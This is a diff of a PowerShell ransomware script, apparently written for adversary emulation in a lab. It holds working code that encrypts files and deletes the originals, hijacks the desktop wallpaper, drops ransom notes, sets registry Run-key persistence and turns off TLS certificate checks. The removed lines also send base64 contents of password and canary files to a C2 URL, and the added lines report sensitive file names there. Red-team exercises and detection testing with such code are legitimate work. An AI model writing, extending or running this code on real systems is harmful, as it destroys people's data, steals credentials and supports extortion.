@@ -1,170 +1,178 @@
 <#
 .SYNOPSIS
-    Apex Pro Adversary Emulation Agent.
-.DESCRIPTION
-    Comprehensive script to simulate ransomware behavior.
+    Apex Pro v2.9 - Final Integrated Agent (Wallpaper, Notes, Exfil, Canary, and TLS Fix)
 #>
 
 param(
     [Parameter(Mandatory=$true)]
     [ValidateSet("Encrypt", "Decrypt")]
-    $Mode, 
+    $Mode,
 
-    [string]$TargetPath = "C:\SimulationData", 
+    [Parameter(Mandatory=$false)]
+    [string]$TargetPath = "C:\SimulationData",
 
-    [string]$C2Url = "https://YOUR_C2_IP/api/v1/telemetry",
+    [Parameter(Mandatory=$false)]
+    [string]$C2Url = "https://192.168.56.1:5000/api/v1/telemetry",
 
-    [int]$Timer = 60
+    [Parameter(Mandatory=$false)]
+    [int]$Timer = 3600
 )
 
-# Global SSL Bypass for Ad-Hoc/Self-Signed Certificates
+# Force TLS 1.2 and Trust Self-Signed Certs (Required for your Custom C2)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
-# Shared AES-256 Key (32 bytes)
+# Shared AES-256 Key (Must match SHARED_KEY in Python)
 $Passphrase = "12345678901234567890123456789012"
 $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)
 
-# --- SECTION 1: WALLPAPER HIJACK ---
-$WP_Code = @'
-using System;
-using System.Runtime.InteropServices;
-public class Wallpaper {
-    [DllImport("user32.dll", CharSet = CharSet.Auto)]
-    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
-    public const int SPI_SETDESKWALLPAPER = 0x0014;
-    public const int SPIF_UPDATEINIFILE = 0x01;
-    public const int SPIF_SENDWININICHANGE = 0x02;
-    public static void Set(string path) {
-        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
-    }
-}
-'@
-Add-Type -TypeDefinition $WP_Code -ErrorAction SilentlyContinue
-
+# --- 1. WALLPAPER ENGINE ---
 function Set-ApexWallpaper {
-    Add-Type -AssemblyName System.Drawing
-    $Path = "$env:TEMP\apex_bg.bmp"
-    $Bmp = New-Object System.Drawing.Bitmap(1920,1080)
-    $G = [System.Drawing.Graphics]::FromImage($Bmp)
-    $G.Clear([System.Drawing.Color]::DarkRed)
-    $Font = New-Object System.Drawing.Font("Impact", 80)
-    $G.DrawString("SYSTEM ENCRYPTED", $Font, [System.Drawing.Brushes]::White, 400, 400)
-    $G.DrawString("Contact Admin to Recover", (New-Object System.Drawing.Font("Arial", 40)), [System.Drawing.Brushes]::White, 550, 550)
-    $Bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Bmp)
-    $G.Dispose(); $Bmp.Dispose()
-    [Wallpaper]::Set($Path)
-}
-
-# --- SECTION 2: CRYPTO ENGINE ---
-function Invoke-ApexCipher {
-    param ($Path, $Key, $Action)
+    $WP_Code = @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class Wallpaper {
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    }
+'@
     try {
-        $Aes = [System.Security.Cryptography.Aes]::Create()
-        $Aes.Key = $Key
-        if ($Action -eq "Encrypt") {
-            $Aes.GenerateIV()
-            $Enc = $Aes.CreateEncryptor()
-            $In = [System.IO.File]::ReadAllBytes($Path)
-            $Out = $Enc.TransformFinalBlock($In, 0, $In.Length)
-            [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
-            Remove-Item $Path -Force
-        } else {
-            $In = [System.IO.File]::ReadAllBytes($Path)
-            $Aes.IV = $In[0..15]
-            $Cipher = $In[16..($In.Length-1)]
-            $Dec = $Aes.CreateDecryptor()
-            $Plain = $Dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
-            [System.IO.File]::WriteAllBytes($Path.Replace(".locked",""), $Plain)
-            Remove-Item $Path -Force
-        }
-    } catch { Write-Warning "Access Denied: $Path" }
+        Add-Type -TypeDefinition $WP_Code -ErrorAction SilentlyContinue
+        Add-Type -AssemblyName System.Drawing
+        $Path = "$env:USERPROFILE\Pictures\apex_bg.bmp"
+        $Bmp = New-Object System.Drawing.Bitmap(1920,1080)
+        $G = [System.Drawing.Graphics]::FromImage($Bmp)
+        $G.Clear([System.Drawing.Color]::DarkRed)
+        $Font = New-Object System.Drawing.Font("Impact", 80)
+        $G.DrawString("SYSTEM ENCRYPTED", $Font, [System.Drawing.Brushes]::White, 400, 400)
+        $Bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Bmp)
+        [Wallpaper]::SystemParametersInfo(0x0014, 0, $Path, 0x01 -bor 0x02)
+    } catch { Send-ApexSignal "ERROR" "Wallpaper Fail" $_.Exception.Message }
 }
 
-# --- SECTION 3: C2 EXFILTRATION (BINARY SYNCED) ---
-function Send-ApexExfil {
-    param ($DataManifest)
-    $FinalPayload = if ($DataManifest -is [string]) { $DataManifest } else { $DataManifest | ConvertTo-Json -Compress }
-
+# --- 2. SIGNALING ENGINE ---
+function Send-ApexSignal {
+    param ($Prefix, $Data1, $Data2 = "")
+    
+    # 1. Prepare the Plaintext
+    $FinalPayload = "$Prefix|$Data1|$Data2"
+    
+    # 2. Manual AES Encryption
     $Aes = [System.Security.Cryptography.Aes]::Create()
-    $Aes.Key = $KeyBytes; $Aes.GenerateIV()
+    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $Aes.Key = $KeyBytes
+    $Aes.GenerateIV()
+    
     $Enc = $Aes.CreateEncryptor()
     $PayloadBytes = [System.Text.Encoding]::UTF8.GetBytes($FinalPayload)
     $Cipher = $Enc.TransformFinalBlock($PayloadBytes, 0, $PayloadBytes.Length)
     
+    # 3. Combine IV (16 bytes) + Ciphertext
     $BinaryBlob = New-Object byte[] (16 + $Cipher.Length)
     [Array]::Copy($Aes.IV, 0, $BinaryBlob, 0, 16)
     [Array]::Copy($Cipher, 0, $BinaryBlob, 16, $Cipher.Length)
     
     try {
+        # 4. Upload as Binary Data
         $WC = New-Object System.Net.WebClient
         $WC.Headers.Add("Content-Type", "application/octet-stream")
         $WC.UploadData($C2Url, "POST", $BinaryBlob) | Out-Null
-        Write-Host "[+] SUCCESS: Data Exfiltrated ($($BinaryBlob.Length) bytes)" -ForegroundColor Green
     } catch {
-        Write-Host "[!!!] EXFIL ERROR: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Telemetry Error: $($_.Exception.Message)" -ForegroundColor Yellow
     }
 }
 
-function Invoke-ApexTheft {
-    param ($FilePath)
-    $FileStream = $null
+# --- 3. CRYPTO ENGINE (WITH FEEDBACK) ---
+function Invoke-ApexCipher {
+    param ($Path, $Key, $Action)
     try {
-        $FileName = Split-Path $FilePath -Leaf
-        $FileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-        $Buffer = New-Object byte[] $FileStream.Length
-        $FileStream.Read($Buffer, 0, $FileStream.Length) | Out-Null
-        $FileStream.Close()
+        $Aes = [System.Security.Cryptography.Aes]::Create()
+        $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $Aes.Key = $Key
+        $FileName = Split-Path $Path -Leaf
+        
+        if ($Action -eq "Encrypt") {
+            $Aes.GenerateIV()
+            $In = [System.IO.File]::ReadAllBytes($Path)
+            $Out = ($Aes.CreateEncryptor()).TransformFinalBlock($In, 0, $In.Length)
+            [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
+            Remove-Item $Path -Force
+            Send-ApexSignal "ENC" $FileName "LOCKED"
+            # After sending the final signal
+            Send-ApexSignal "COMPLETE" "All Files" $TotalSize
 
-        $B64Content = [Convert]::ToBase64String($Buffer)
-        $TheftPayload = "LOOT|$FileName|$B64Content"
-        Send-ApexExfil -DataManifest $TheftPayload
+            # Add this small sleep to let the SSL socket close properly
+            Start-Sleep -Milliseconds 500
+            Exit
+        } 
+        else {
+            # --- DECRYPT FEEDBACK LOGIC ---
+            Write-Host "[*] Restoring: $FileName..." -ForegroundColor Cyan
+            
+            $In = [System.IO.File]::ReadAllBytes($Path)
+            $Aes.IV = $In[0..15]
+            $Plain = ($Aes.CreateDecryptor()).TransformFinalBlock($In, 16, ($In.Length-16))
+            
+            $OriginalPath = $Path.Replace(".locked","")
+            [System.IO.File]::WriteAllBytes($OriginalPath, $Plain)
+            Remove-Item $Path -Force
+            
+            # Success feedback in console
+            Write-Host "[+] Success: $FileName restored." -ForegroundColor Green
+            Send-ApexSignal "ENC" $FileName "RESTORED"
+        }
     } catch { 
-        if ($FileStream) { $FileStream.Close() }
-        Write-Host "[!] Theft Failed for $FilePath" -ForegroundColor Gray 
+        Write-Host "[!] Error processing $FileName : $($_.Exception.Message)" -ForegroundColor Red
+        Send-ApexSignal "ERROR" "Cipher Failed" (Split-Path $Path -Leaf) 
     }
 }
 
-# --- SECTION 4: MAIN EXECUTION ---
+# --- 4. MAIN EXECUTION ---
 if ($Mode -eq "Encrypt") {
-    Write-Host "[!] INITIATING IMPACT PHASE..." -ForegroundColor Red
+    # Visuals
     Set-ApexWallpaper
 
-    $CurrentPath = $MyInvocation.MyCommand.Path
-    $RunValue = if ($CurrentPath -like "*.exe") { "`"$CurrentPath`"" } else { "powershell.exe -WindowStyle Hidden -File `"$PSCommandPath`" -Mode Encrypt" }
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -Value $RunValue -Force | Out-Null
+    # Persistence
+    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $PayloadPath = "`"$PSCommandPath`" -Mode Encrypt"
+    New-ItemProperty -Path $RunKey -Name "ApexUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PayloadPath" -PropertyType String -Force | Out-Null
+    Send-ApexSignal "PERSIST" "Registry RunKey" $RunKey
 
-    $Targets = @($TargetPath)
-    $Targets += Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DisplayRoot } | Select-Object -ExpandProperty Root
+    # Target Discovery
+    if (-not (Test-Path $TargetPath)) { New-Item -ItemType Directory -Path $TargetPath -Force | Out-Null }
+    $Files = Get-ChildItem $TargetPath -Recurse -File | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
+    $Dirs = Get-ChildItem $TargetPath -Recurse -Directory
+    $Dirs += Get-Item $TargetPath
 
-    foreach ($T in $Targets) {
-        if (Test-Path $T) {
-            $Files = Get-ChildItem $T -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
-            if ($Files) { 
-                Send-ApexExfil -DataManifest ($Files | Select-Object Name, Length) 
-                foreach ($F in $Files) { 
-                    if ($F.Name -like "*ADMIN_PASSWORDS*" -or $F.Name -like "*canary*") {
-                        Write-Host "[!] TARGET IDENTIFIED: $($F.Name). Stealing..." -ForegroundColor Yellow
-                        Invoke-ApexTheft -FilePath $F.FullName
-                        Start-Sleep -Milliseconds 500
-                    }
-                    Invoke-ApexCipher -Path $F.FullName -Key $KeyBytes -Action "Encrypt" 
-                }
-            }
-            $Dirs = Get-ChildItem $T -Recurse -Directory -ErrorAction SilentlyContinue; $Dirs += Get-Item $T
-            foreach ($D in $Dirs) { 
-                "<html><body style='background-color:black;color:red;text-align:center;'><h1>!!! CONTACT ADMIN TO RECOVER DATA !!!</h1></body></html>" | Out-File (Join-Path $D.FullName "RECOVER_FILES_NOW.html") -Force 
-            }
-        }
+    # Drop Ransom Notes
+    foreach ($D in $Dirs) {
+        $Note = "<html><body style='background:black;color:red;text-align:center;'><h1>!!! DATA ENCRYPTED BY APEX PRO !!!</h1><p>Contact Admin to Recover.</p></body></html>"
+        $Note | Out-File (Join-Path $D.FullName "RECOVER_FILES_NOW.html") -Force
     }
 
+    # Process Files
+    foreach ($F in $Files) {
+        if ($F.Name -like "*canary*") { Send-ApexSignal "CANARY" $F.Name "Accessed" }
+        if ($F.Name -like "*PASS*" -or $F.Name -like "*SECRET*") {
+            Send-ApexSignal "EXFIL" $F.Name $F.Length
+        }
+        Invoke-ApexCipher -Path $F.FullName -Key $KeyBytes -Action "Encrypt"
+    }
+
+    # Countdown
     $End = (Get-Date).AddSeconds($Timer)
     while ((Get-Date) -lt $End) {
-        Write-Host "`r[!] DATA WIPE IN: $(($End - (Get-Date)).ToString('mm\:ss'))" -NoNewline -ForegroundColor Red
+        $Remaining = ($End - (Get-Date)).ToString('hh\:mm\:ss')
+        Write-Host "`r[!] DATA ENCRYPTED. TIME REMAINING: $Remaining " -NoNewline -ForegroundColor Red
         Start-Sleep 1
     }
+    # Optional: Secure wipe of locked files after timer expires
+    # Get-ChildItem $TargetPath -Filter "*.locked" | Remove-Item -Force
 } 
 else {
-    Write-Host "[*] INITIATING RECOVERY PHASE..." -ForegroundColor Green
+    # Decrypt Mode
     Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | ForEach-Object { Invoke-ApexCipher -Path $_.FullName -Key $KeyBytes -Action "Decrypt" }
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -ErrorAction SilentlyContinue
 }
